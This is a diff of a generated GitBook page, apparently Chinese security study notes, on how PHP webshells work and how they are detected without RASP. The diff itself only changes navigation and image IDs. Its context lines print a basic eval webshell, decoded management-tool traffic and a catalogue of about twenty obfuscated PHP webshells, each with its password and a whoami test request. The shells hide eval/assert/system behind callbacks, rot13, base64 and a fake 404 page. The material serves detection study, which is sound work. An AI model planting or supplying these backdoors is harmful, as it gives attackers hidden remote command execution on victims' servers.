@@ -61,6 +61,10 @@
                 
             
                 
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-lock/lock.css">
+                
+            
+                
                 <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
@@ -1093,6 +1097,19 @@
             
                     
                     15.Fastjson检测规则梳理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15.16" data-path="16.Chrome实时修改javascript.html">
+            
+                <a href="16.Chrome实时修改javascript.html">
+            
+                    
+                    16.Chrome实时修改javascript
             
                 </a>
             
@@ -3153,7 +3170,7 @@
 <ul>
 <li>&#x9996;&#x5148;&#x5728;&#x8681;&#x5251;&#x6DFB;&#x52A0;&#x624B;&#x52A8;&#x4EE3;&#x7406;&#xFF0C;&#x7528;&#x4E8E;<code>Burp</code>&#x6293;&#x5305;&#x5206;&#x6790;</li>
 </ul>
-<p><a href="webshell&#x539F;&#x7406;.assets/webshell_1.png" data-lightbox="f026bff6-e97c-44cb-8014-14a2e88c55e7" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_1.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/webshell_1.png" data-lightbox="bf98c89b-6647-4e11-901c-1871fa45792b" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_1.png" alt=""></a></p>
 <ul>
 <li>PHP 5.4.45 + apache</li>
 <li>webshell</li>
@@ -3161,7 +3178,7 @@
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;cmd&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
 <h4 id="&#x6293;&#x5305;&#x5206;&#x6790;">&#x6293;&#x5305;&#x5206;&#x6790;</h4>
-<p><a href="webshell&#x539F;&#x7406;.assets/webshell_2.png" data-lightbox="00e70dfd-b34f-4e73-ae3f-76a1901e112f" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_2.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/webshell_2.png" data-lightbox="e72bdbac-141b-4065-ad0c-e2747ab91105" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_2.png" alt=""></a></p>
 <pre class="language-"><code class="lang-php"><span class="token comment">// &#x4E34;&#x65F6;&#x5173;&#x95ED;PHP&#x7684;&#x9519;&#x8BEF;&#x663E;&#x793A;&#x529F;&#x80FD;</span>
 @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;display_errors&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// &#x8BBE;&#x7F6E;&#x6267;&#x884C;&#x65F6;&#x95F4;&#xFF0C;&#x4E3A;&#x96F6;&#x8BF4;&#x660E;&#x6C38;&#x4E45;&#x6267;&#x884C;&#x76F4;&#x5230;&#x7A0B;&#x5E8F;&#x7ED3;&#x675F;&#xFF0C;&#x662F;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x50CF;dir&#x3001;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x5927;&#x9A6C;&#x65F6;&#x8D85;&#x65F6;&#x3002;</span>
@@ -3227,7 +3244,7 @@
 <span class="token function">posix_geteuid</span> <span class="token punctuation">(</span> <span class="token keyword type-declaration">void</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span>
 </code></pre>
 <p>&#x5C06;&#x6B64;&#x4EE3;&#x7801;&#x5C01;&#x88C5;&#x5728;<code>eval</code>&#x51FD;&#x6570;&#x4E2D;,&#x8BA9;<code>eval</code>&#x51FD;&#x6570;&#x5C06;&#x6B64;&#x4EE3;&#x7801;&#x5F53;&#x4F5C;php&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/webshell_3.png" data-lightbox="ba278a29-f942-4ee2-afd9-f2a299415968" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_3.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/webshell_3.png" data-lightbox="0cc7dc80-8745-4340-93cc-950b98bd95cc" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_3.png" alt=""></a></p>
 <p>&#x5F53;&#x4F7F;&#x7528;&#x5217;&#x76EE;&#x5F55;&#x7B49;&#x547D;&#x4EE4;&#x6293;&#x5305;&#x5206;&#x6790;&#x5982;&#x4E0B;&#xFF1A;</p>
 <pre class="language-"><code class="lang-php">@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;display_errors&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 @<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -3271,7 +3288,7 @@
 </code></pre>
 <pre class="language-"><code class="lang-php"><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;QzovcGhwU3R1ZHkvV1dXLw==&quot;</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;C:/phpStudy/WWW/&quot;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/webshell_4.png" data-lightbox="7ded0a9e-7162-4352-b16b-a8dc71cbaf69" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_4.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/webshell_4.png" data-lightbox="c6cc46a7-3327-4b97-8f2e-685eff8b7128" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_4.png" alt=""></a></p>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x89C1;&#xFF0C;&#x5176;&#x5B9E;&#x7528;&#x4E8E;eval&#x51FD;&#x6570;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x90FD;&#x662F;&#x5927;&#x4F53;&#x76F8;&#x540C;&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x66F4;&#x6539;&#x4E86;<code>try-catch</code>&#x4EE3;&#x7801;&#x5757;&#x4E2D;&#x7684;&#x903B;&#x8F91;&#xFF0C;&#x5BF9;&#x4E8E;&#x4F20;&#x7EDF;&#x7684;webshell&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x8FDE;&#x63A5;webshell&#x5E76;&#x4E14;&#x6267;&#x884C;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7C7B;&#x4F3C;<code>eval</code>,<code>assert</code>&#x7B49;&#x51FD;&#x6570;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x5F53;&#x4F5C;php&#x4EE3;&#x7801;&#x6267;&#x884C;&#x7684;&#x6027;&#x8D28;&#xFF0C;&#x5F53;&#x8FDE;&#x63A5;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5F53;&#x524D;web&#x5BB9;&#x5668;&#x53EF;&#x89E3;&#x6790;&#x7684;&#x8BED;&#x8A00;&#x6267;&#x884C;&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x5B8C;&#x6210;&#x76F8;&#x5173;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>
 <h3 id="php&#x53EF;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x51FD;&#x6570;">PHP&#x53EF;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x51FD;&#x6570;</h3>
 <h4 id="system">system</h4>
@@ -3450,18 +3467,18 @@
 <p>&#x5728;php7+&#xFF0C;<strong>eval</strong>&#x662F;&#x4E00;&#x4E2A;&#x8BED;&#x8A00;&#x6784;&#x9020;&#x5668;&#xFF0C;<strong>assert</strong>&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x8BED;&#x8A00;&#x6784;&#x9020;&#x5668;</p>
 <h4 id="&#x5B98;&#x7F51;&#x4ECB;&#x7ECD;">&#x5B98;&#x7F51;&#x4ECB;&#x7ECD;</h4>
 <h5 id="assert">assert</h5>
-<p><a href="webshell&#x539F;&#x7406;.assets/webshell_5.png" data-lightbox="ada9a7e7-14ea-4a8e-a7ac-13e6d920bf63" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_5.png" alt=""></a></p>
-<p><a href="webshell&#x539F;&#x7406;.assets/webshell_6.png" data-lightbox="6a655a5b-32b9-44b4-949a-97ef15a07f45" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_6.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/webshell_5.png" data-lightbox="eb918417-4a61-4602-80e5-344498a777a8" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_5.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/webshell_6.png" data-lightbox="624b9c64-2c36-4af9-bd25-407bc5c2e93f" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_6.png" alt=""></a></p>
 <h5 id="eval">eval</h5>
-<p><a href="webshell&#x539F;&#x7406;.assets/webshell_7.png" data-lightbox="665c374d-95a1-4f68-90c6-a104d0ff13c2" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_7.png" alt=""></a></p>
-<p><a href="webshell&#x539F;&#x7406;.assets/webshell_8.png" data-lightbox="8af82e80-b829-40eb-862c-e3429696c163" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_8.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/webshell_7.png" data-lightbox="839da094-3e71-4a40-8e9a-fef7c738e9e2" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_7.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/webshell_8.png" data-lightbox="9a5769d1-a81f-4696-9cf4-1337843faefe" data-title=""><img src="webshell&#x539F;&#x7406;.assets/webshell_8.png" alt=""></a></p>
 <h3 id="webshell&#x68C0;&#x6D4B;&#xFF08;&#x672A;&#x5F00;&#x542F;rasp&#xFF09;">webshell&#x68C0;&#x6D4B;&#xFF08;&#x672A;&#x5F00;&#x542F;Rasp&#xFF09;</h3>
 <h4 id="1php">1.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># password : h</span>
 <span class="token comment"># url:http://10.95.58.17/Joomla/uploadComponents/upload/1.php?h=whoami</span>
 </code></pre>
 <p>&#x6267;&#x884C;&#x7ED3;&#x679C;:</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/1.png" data-lightbox="dff6b96f-b5b9-4b85-9c1e-35df9975aeec" data-title=""><img src="webshell&#x539F;&#x7406;.assets/1.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/1.png" data-lightbox="8b3a4bc0-aa32-4fc7-b794-93c312251f17" data-title=""><img src="webshell&#x539F;&#x7406;.assets/1.png" alt=""></a></p>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> 
     <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;h&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     @<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -3523,7 +3540,7 @@
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$b4dboy</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;b4dboy&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
 @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;/ad/e&apos;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&apos;@&apos;</span><span class="token operator">.</span><span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;riny&apos;</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;(<span class="token interpolation"><span class="token variable">$b4dboy</span></span>)&quot;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&apos;add&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/2.png" data-lightbox="99d9a750-9489-4174-88e3-d45d28a12d06" data-title=""><img src="webshell&#x539F;&#x7406;.assets/2.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/2.png" data-lightbox="e5db5d9d-f2f6-4986-b730-7e79392ce966" data-title=""><img src="webshell&#x539F;&#x7406;.assets/2.png" alt=""></a></p>
 <h4 id="3php">3.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># password : cmd</span>
 </code></pre>
@@ -3534,7 +3551,7 @@
     <span class="token function">register_shutdown_function</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;cmd&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/3.png" data-lightbox="c418761e-6195-486e-853e-85bf08cee4ca" data-title=""><img src="webshell&#x539F;&#x7406;.assets/3.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/3.png" data-lightbox="11d7da32-622e-4dcf-ac9e-066485040320" data-title=""><img src="webshell&#x539F;&#x7406;.assets/3.png" alt=""></a></p>
 <h4 id="4php">4.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># passwd: h</span>
 </code></pre>
@@ -3545,7 +3562,7 @@
     <span class="token function">array_udiff_assoc</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;h&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/4.png" data-lightbox="a26a8d0c-47aa-4c4a-842a-18d116e52660" data-title=""><img src="webshell&#x539F;&#x7406;.assets/4.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/4.png" data-lightbox="7326922c-cf6d-49b0-8042-be264f3b0cbb" data-title=""><img src="webshell&#x539F;&#x7406;.assets/4.png" alt=""></a></p>
 <h4 id="5sphp">5s.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># php5&gt;=php5.3.0 php7 php7.1+&#x4E0D;&#x53EF;&#x7528;</span>
 <span class="token comment"># password:h</span>
@@ -3583,7 +3600,7 @@
     <span class="token function">forward_static_call_array</span><span class="token punctuation">(</span><span class="token variable">$wx</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;tem&quot;</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token variable">$password</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/6.png" data-lightbox="7712d431-7fac-460c-b41e-ba42813d0048" data-title=""><img src="webshell&#x539F;&#x7406;.assets/6.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/6.png" data-lightbox="10c9d578-6473-455c-9df8-1400d55a0004" data-title=""><img src="webshell&#x539F;&#x7406;.assets/6.png" alt=""></a></p>
 <h4 id="7php">7.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># password: h</span>
 <span class="token comment"># Cookie: set-domain-name=ass</span>
@@ -3610,7 +3627,7 @@
     <span class="token function">array_intersect_ukey</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token variable">$password</span><span class="token punctuation">]</span><span class="token operator">=&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$ch</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;tem&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/7.png" data-lightbox="7da91eeb-af6c-4e9d-804b-2873173a3d41" data-title=""><img src="webshell&#x539F;&#x7406;.assets/7.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/7.png" data-lightbox="fe07c99a-29cf-4fa0-a671-35fea83b331e" data-title=""><img src="webshell&#x539F;&#x7406;.assets/7.png" alt=""></a></p>
 <h4 id="8php">8.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># PHP5&gt;=5.4.0,PHP7</span>
 <span class="token comment"># password:h</span>
@@ -3639,7 +3656,7 @@
     <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;assert&apos;</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;h&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/9.png" data-lightbox="89ae648a-6f66-4ff8-8069-98b2efed2033" data-title=""><img src="webshell&#x539F;&#x7406;.assets/9.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/9.png" data-lightbox="783ae0ce-27bc-42df-bb8f-e04e909b7254" data-title=""><img src="webshell&#x539F;&#x7406;.assets/9.png" alt=""></a></p>
 <h4 id="10php">10.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># PHP5&gt;=5.4.0,PHP7</span>
 <span class="token comment"># password: e=YXNzZXJ0&amp;pass=</span>
@@ -3666,7 +3683,7 @@
     <span class="token function">array_reduce</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span> <span class="token variable">$e</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;pass&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/12.png" data-lightbox="6ea70ba1-6631-452b-b332-4f18a39e7409" data-title=""><img src="webshell&#x539F;&#x7406;.assets/12.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/12.png" data-lightbox="e51e51c6-7eb1-42cb-b85e-907ec30b5f65" data-title=""><img src="webshell&#x539F;&#x7406;.assets/12.png" alt=""></a></p>
 <h4 id="13php">13.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># password:e=assert&amp;pass=phpinfo()</span>
 </code></pre>
@@ -3677,7 +3694,7 @@
     <span class="token function">array_udiff</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span> <span class="token variable">$arr2</span><span class="token punctuation">,</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/13.png" data-lightbox="8d05ec4d-1f9f-436a-9de2-5e4b0552c369" data-title=""><img src="webshell&#x539F;&#x7406;.assets/13.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/13.png" data-lightbox="98c7fb52-d833-463f-befa-b838f1ee6b93" data-title=""><img src="webshell&#x539F;&#x7406;.assets/13.png" alt=""></a></p>
 <h4 id="14php">14.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span>
     <span class="token variable">$POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;POST&apos;</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">&apos;assert&apos;</span><span class="token punctuation">;</span>
@@ -3701,7 +3718,7 @@
     @<span class="token variable">$gg</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/15.png" data-lightbox="c5736829-3945-4800-87c2-1250b1361d0f" data-title=""><img src="webshell&#x539F;&#x7406;.assets/15.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/15.png" data-lightbox="61a86dd6-8c83-4de8-b15f-765c106da373" data-title=""><img src="webshell&#x539F;&#x7406;.assets/15.png" alt=""></a></p>
 <h4 id="16php">16.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span>
     <span class="token variable">$e</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;e&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -3709,7 +3726,7 @@
     <span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/16.png" data-lightbox="2cb4cb53-29af-400f-a8f2-167d499c9cd4" data-title=""><img src="webshell&#x539F;&#x7406;.assets/16.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/16.png" data-lightbox="b4073599-6850-4968-91cc-799ce98a8079" data-title=""><img src="webshell&#x539F;&#x7406;.assets/16.png" alt=""></a></p>
 <h4 id="17php">17.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span>
     <span class="token variable">$e</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;e&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -3717,16 +3734,16 @@
     <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/17.png" data-lightbox="ad05bf4d-0ce7-4c19-9d99-88fcc0ed743c" data-title=""><img src="webshell&#x539F;&#x7406;.assets/17.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/17.png" data-lightbox="fcd6a276-e659-4f93-afce-d2eea5806963" data-title=""><img src="webshell&#x539F;&#x7406;.assets/17.png" alt=""></a></p>
 <h4 id="18php">18.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># password:pass=system()</span>
 </code></pre>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">mb_ereg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;.*&apos;</span><span class="token punctuation">,</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;pass&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&apos;&apos;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&apos;e&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/18.png" data-lightbox="e397d662-1213-46d1-a176-63c8e8119b97" data-title=""><img src="webshell&#x539F;&#x7406;.assets/18.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/18.png" data-lightbox="c4dc0260-f90f-4605-8eb0-0a5d3717d958" data-title=""><img src="webshell&#x539F;&#x7406;.assets/18.png" alt=""></a></p>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">mb_ereg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;.*&apos;</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;pass&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&apos;&apos;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&apos;e&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/19.png" data-lightbox="ba0f101d-e438-441c-aa5f-5670318b5401" data-title=""><img src="webshell&#x539F;&#x7406;.assets/19.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/19.png" data-lightbox="0cb1f5d3-cf30-4515-8a1f-413377c623fe" data-title=""><img src="webshell&#x539F;&#x7406;.assets/19.png" alt=""></a></p>
 <h4 id="19php">19.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token comment"># password: e=system&amp;pass=whoami</span>
 </code></pre>
@@ -3736,7 +3753,7 @@
     <span class="token function">register_tick_function</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;pass&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/20.png" data-lightbox="07283c5b-a4f4-4b79-8a5f-eb79ed787d6a" data-title=""><img src="webshell&#x539F;&#x7406;.assets/20.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/20.png" data-lightbox="9ece8e81-278f-4f72-a16c-fc75fc10d1d7" data-title=""><img src="webshell&#x539F;&#x7406;.assets/20.png" alt=""></a></p>
 <h4 id="20php">20.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span>
     <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;pass&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_CALLBACK</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;options&apos;</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">&apos;assert&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -3745,7 +3762,7 @@
 <h4 id="21php">21.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/21.png" data-lightbox="5e209491-a0bc-495b-9570-858badd4d28c" data-title=""><img src="webshell&#x539F;&#x7406;.assets/21.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/21.png" data-lightbox="fd9101ae-94d5-4b55-8687-0dbb118e81db" data-title=""><img src="webshell&#x539F;&#x7406;.assets/21.png" alt=""></a></p>
 <h4 id="22php">22.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> <span class="token constant">HTML</span> <span class="token keyword">PUBLIC</span> <span class="token string double-quoted-string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span><span class="token operator">&gt;</span>
 <span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
@@ -3770,11 +3787,11 @@
 <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;HTTP/1.1 404 Not Found&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span class="token operator">&gt;</span>
